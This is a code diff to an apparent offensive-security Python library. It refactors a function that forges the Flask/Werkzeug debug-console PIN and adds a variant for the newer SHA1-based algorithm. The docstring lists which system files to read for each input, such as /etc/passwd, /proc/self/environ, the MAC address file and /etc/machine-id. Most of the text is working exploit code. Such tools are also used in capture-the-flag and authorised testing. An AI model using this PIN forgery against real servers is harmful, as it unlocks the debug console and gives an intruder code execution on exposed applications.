@@ -164,39 +164,24 @@ def _generateTrashWithoutValue(diff_len: int, remain: int):
     result = '''s:%d:"_%s";''' % (num_len, random_string(filled_len))
     return k, result
 
-
-def get_flask_pin(username: str, absRootPath: str, macAddress: str, machineId: str, modName: str = "flask.app",
-                  appName: str = "Flask") -> str:
-    """get flask debug pin code.
-
-    Args:
-        username (str): username of flask, try get it from /etc/passwd or /proc/self/environ
-        absRootPath (str): project abs root path,from getattr(mod, '__file__', None)
-        macAddress (str): mac address,from /sys/class/net/<eth0>/address
-        machineId (str): machine id,from /proc/self/cgroup first line with string behind /docker/ or /etc/machine-id or /proc/sys/kernel/random/boot_id
-        modName (str, optional): mod name.  Defaults to "flask.app".
-        appName (str, optional): app name, from getattr(app, '__name__', getattr(app.__class__, '__name__')). Defaults to "Flask".
-
-    Returns:
-        str: flask debug pin code
-    """
-    rv, num = None, None
-    probably_public_bits = [
+def _collate_value_for_generate_pin(username: str, absRootPath: str, macAddress: str, machineId: str, modName: str, appName: str):
+    return [
         username,
         modName,
         # getattr(app, '__name__', getattr(app.__class__, '__name__'))
         appName,
         # getattr(mod, '__file__', None),
         absRootPath,
-    ]
-
-    private_bits = [
+    ], [
         # str(uuid.getnode()),  /sys/class/net/ens33/address
         str(int(macAddress.strip().replace(":", ""), 16)),
         machineId,  # get_machine_id(), /etc/machine-id
     ]
 
+def _get_flask_pin(probably_public_bits, private_bits) -> str:
     h = _md5()
+    rv, num = None, None
+
     for bit in chain(probably_public_bits, private_bits):
         if not bit:
             continue
@@ -210,12 +195,67 @@ def get_flask_pin(username: str, absRootPath: str, macAddress: str, machineId: s
 
     for group_size in 5, 4, 3:
         if len(num) % group_size == 0:
-            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
-                          for x in range(0, len(num), group_size))
+            rv = '-'.join(
+                num[x:x + group_size].rjust(group_size, '0')
+                for x in range(0, len(num), group_size)
+            )
             break
     else:
         rv = num
     return rv
+
+def _get_flask_200_pin(probably_public_bits, private_bits) -> str:
+    h = _sha1()
+    rv, num = None, None
+
+    for bit in chain(probably_public_bits, private_bits):
+        if not bit:
+            continue
+        if isinstance(bit, str):
+            bit = bit.encode("utf-8")
+        h.update(bit)
+    h.update(b"cookiesalt")
+
+    if num is None:
+        h.update(b"pinsalt")
+        num = f"{int(h.hexdigest(), 16):09d}"[:9]
+
+    if rv is None:
+        for group_size in 5, 4, 3:
+            if len(num) % group_size == 0:
+                rv = "-".join(
+                    num[x : x + group_size].rjust(group_size, "0")
+                    for x in range(0, len(num), group_size)
+                )
+                break
+        else:
+            rv = num
+    return rv
+
+
+def get_flask_pin(username: str, absRootPath: str, macAddress: str, machineId: str, version: int = 100, modName: str = "flask.app",
+                  appName: str = "Flask") -> str:
+    """get flask debug pin code.
+
+    Args:
+        username (str): username of flask, try get it from /etc/passwd or /proc/self/environ
+        absRootPath (str): project abs root path,from getattr(mod, '__file__', None)
+        macAddress (str): mac address,from /sys/class/net/<eth0>/address
+        machineId (str): machine id,[from /proc/self/cgroup first line with string behind /docker/] or [/etc/machine-id] or [/proc/sys/kernel/random/boot_id]. In version 2.0.0 it became [[/etc/machine-id] or [/proc/sys/kernel/random/boot_id]] splice on [from /proc/self/cgroup first line with string behind /docker/]
+        modName (str, optional): mod name.  Defaults to "flask.app".
+        appName (str, optional): app name, from getattr(app, '__name__', getattr(app.__class__, '__name__')). Defaults to "Flask".
+        version (int): Here you can choose the corresponding generation algorithm according to the version number. Defaults to 100 i.e. `1.0.0` version.
+
+    Returns:
+        str: flask debug pin code
+    """
+    probably_public_bits, private_bits = _collate_value_for_generate_pin(username, absRootPath, macAddress, machineId, modName, appName)
+
+    if (version >= 200):
+        return _get_flask_200_pin(probably_public_bits, private_bits)
+    else:
+        return _get_flask_pin(probably_public_bits, private_bits)
+    
 
 
 class _App:
